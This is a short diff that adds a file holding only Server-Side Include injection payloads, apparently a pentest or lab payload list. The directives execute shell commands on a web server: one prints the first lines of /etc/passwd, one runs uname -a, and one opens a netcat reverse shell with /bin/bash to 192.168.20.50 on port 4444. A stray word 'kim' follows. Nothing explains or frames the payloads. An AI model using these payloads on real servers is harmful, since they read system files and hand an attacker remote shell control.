@@ -1,0 +1,7 @@
+<!--#exec cmd="head -3 /etc/passwd" -->
+<!--#exec cmd="uname -a" -->
+
+
+<!--#exec cmd="nc -e /bin/bash 192.168.20.50 4444" -->
+kim
+
